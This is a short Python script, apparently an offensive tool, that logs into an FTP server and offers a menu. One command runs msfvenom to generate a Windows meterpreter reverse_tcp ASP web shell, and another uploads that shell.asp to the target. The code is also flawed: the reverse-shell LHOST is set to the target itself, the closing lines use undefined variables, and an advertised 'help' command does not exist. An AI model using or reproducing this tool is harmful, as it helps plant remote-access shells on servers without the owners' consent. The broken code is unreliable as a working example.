#!/usr/bin/python3
import ftplib, linecache, sys, time, os

def login(ftp,user,passw):
    try:        
        ftp.login(user.strip(),passw.strip())
        print("\nCURRENT DIRECTORY:")
        data = []
        ftp.dir(data.append)
        for line in data:
            print("-", line)
    except Exception as e:
        print(e)
        
def process(ftp, os, target):
    loop = True
    command = None
    while loop:
        
        print ("\nFTP CLIENT -- ENTER 'help' FOR COMMANDS")
        print('\n')
        command = input('Enter a command: ')
        print('\n')
        
        if command=='ls':
            print ('\n')
            print (ftp.sendcmd('PWD'))
            print ("CURRENT DIRECTORY of " + target + ": " + ftp.sendcmd('PWD'))
            data = []
            ftp.dir(data.append)
            for line in data:
                print ("-", line)  
                
        elif command=='local':
            print('\n')
            print ("LOCAL DIRECTORY: ")
            os.system("dir")
                
        elif command=='payload':
            print("Attempting to create payload.")
            print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + target + " LPORT=" + "21" + " -f asp > shell.asp")
            os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + target + " LPORT=" + "21" + " -f asp > shell.asp")
            print('\n')
            print("Payload Created.")
            print('\n')
            print ("LOCAL DIRECTORY: ")
            os.system("dir")
            
        elif command=='upload':
            print('\n')
            print("Attempting to deliver payload.")
            print("STOR shell.asp")
            print('\n')
            time.sleep(3)
            file = open("shell.asp","rb")                  # file to send
            ftp.storbinary('STOR shell.asp', file)         # send the file
            print ('\n')
            print ("CURRENT DIRECTORY of " + target + ": " + ftp.sendcmd('PWD'))
            data = []
            ftp.dir(data.append)
            for line in data:
                print ("-", line)  
            print('\n')
            print("Payload Delivered.")
            print('\n')
            
        elif command=='q':
            loop = False
            

host=hostIP
username=user
passw=password
ftp=ftplib.FTP(host)
login(ftp,user,passw)
process(ftp, os, host)
